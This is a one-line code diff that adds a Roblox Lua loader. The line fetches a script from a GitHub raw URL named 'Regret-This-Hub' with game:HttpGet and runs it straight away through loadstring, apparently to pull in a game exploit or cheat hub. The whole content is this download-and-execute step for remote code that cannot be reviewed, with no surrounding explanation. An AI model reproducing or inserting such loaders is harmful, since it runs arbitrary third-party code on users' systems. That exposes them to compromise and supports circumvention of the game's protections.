@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/wasduiop/Regret-This-Hub/refs/heads/main/script.lua'))()
